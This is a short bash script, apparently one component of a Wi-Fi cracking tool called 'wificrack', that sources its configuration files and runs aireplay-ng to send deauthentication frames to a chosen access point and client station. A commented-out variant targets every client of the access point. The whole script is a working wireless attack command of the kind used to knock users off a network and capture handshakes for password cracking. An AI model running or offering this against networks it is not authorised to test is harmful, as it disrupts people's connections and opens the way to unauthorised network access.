#!/bin/bash

PWD="$(pwd)"
CONFIG_DIR="$HOME/.wificrack"
CONFIG_FILE="$CONFIG_DIR/config.conf"
source "$CONFIG_FILE"

source "$CONFIG_INTERFACE"
source "$CURRENT_ATTACK_FILE"
source "$CONFIG_ATTACK"

aireplay-ng --deauth 4 -a "$BSSID" -c "$STATION" "$INTERFACE"
#aireplay-ng --deauth 4 -a "$BSSID" "$INTERFACE"
